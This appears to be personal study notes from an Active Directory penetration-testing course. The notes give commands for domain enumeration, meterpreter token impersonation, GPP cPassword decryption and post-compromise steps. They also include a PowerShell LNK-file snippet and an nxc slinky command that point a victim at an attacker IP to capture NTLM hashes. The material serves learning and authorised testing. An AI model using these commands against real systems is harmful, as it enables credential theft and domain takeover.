---
title: "AD TCM"
parent: "5 - Unsorted Security"
nav_order: 5
layout: default
---

# AD TCM

### Tools 
Ldapdomaindump
- `sudo ldapdomaindump ldaps://$dcIP -u '$Domain\$user' -p $$Password`
	- note that this gives html files (among others) as output, so we can run `firefox file.html` to view them.

Bloodhound
- duh

Plumhound
- sister tool of Bloodhound, mostly seems like it just takes the info from bloodhound and make it more digestible. The bloodhound interface is trash, after all. 
- `sudo python3 Plumhound.py -x tasks/default.tasks -p $neo4jpassword`
	- You can mostly just go to the index.html file
- Note that you do still need neo4j and bloodhound running, it is taking info from those tools
- `--easy` is for a test, very little info: `sudo python3 Plumhound.py --easy -p $neo4jpassword`

### Token Impersonation
Tokens are temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers. 

Two types:
- Delegate - Create for logging into a machine or using Remote Desktop
- Impersonate - "non-interactive" such as attaching a network drive or a domain logon script

It seems like this is primarily meterpreter shells here. In the example, he impersonates on meterpreter, then just adds a user account, then uses secrets dump with that account. 
- meterpreter > `load incognito`
	- note that you can `load` and then hit tab to see kiwi or whatever else
- meterpreter > `list_tokens -u`
- meterpreter > `impersonate_token domain\\user`
	- note that two slashes are required

### LNK file attack
This generates file which will allow us to get a hash:
```
$objShell = New-Object -ComObject WScript.shell $lnk = $objShell.CreateShortcut("C:\test.lnk") $lnk.TargetPath = "\\192.168.138.149\@test.png" $lnk.WindowStyle = 1 $lnk.IconLocation = "%windir%\system32\shell32.dll, 3" $lnk.Description = "Test" $lnk.HotKey = "Ctrl+Alt+T" $lnk.Save()
```
It will attempt to access 192.168.138.149 (your kali machine), where we would want to set up responder and catch the NTLM. 
- Realistically though, this just get saved to the C:\ drive, would potentially need to go somewhere else. 
- Can use: `nxc smb $targetIP
-d $domain.com -u $user -p $password -M slinky -o NAME=$filename SERVER=$attackerIP`
	- Module name is slinky
	- Server is attacker IP

### GPP Attack (cPassword attack)
- Group Policy Preferences
- GPP allowed admins to create policies using embedded creds which were encrypted in a "cPassword"
	- The key was accidentally released
	- Patched in MS14-025, but it doesn't prevent previous uses
- You're looking for `cPassword="sdfsdfsd...` and then use gpp-decrypt
- This is in Groups.xml in SYSVOL

### Post-Compromise Attack Strategy
Now that we have an account - 
Quick wins:
- Kerberoasting
- Secretsdump
- Pass the hash/password

No Quick wins:
- Enumerate (Bloodhound, etc.)
- Where does the account have access?
- Old vulnerabilities

Think outside the box

### Post-Compromise What Else
NTDS contains all the Active Directory information 
